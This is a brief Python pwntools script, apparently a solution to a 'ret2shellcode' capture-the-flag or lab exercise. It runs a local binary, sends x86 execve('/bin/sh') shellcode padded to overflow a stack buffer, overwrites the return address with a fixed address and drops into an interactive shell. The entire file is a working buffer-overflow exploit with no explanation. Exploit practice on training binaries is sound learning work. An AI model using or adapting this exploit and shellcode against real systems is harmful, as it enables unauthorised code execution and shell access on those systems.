from pwn import *

sh = process("./bin/ret2shellcode")
target = 0x0804A080
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73"
    b"\x68\x68\x2f\x62\x69\x6e\x89"
    b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
    b"\xcd\x80\x31\xc0\x40\xcd\x80"
)

sh.sendline(shellcode + b"a" * (0x6C + 4 - len(shellcode)) + p32(target))
sh.interactive()
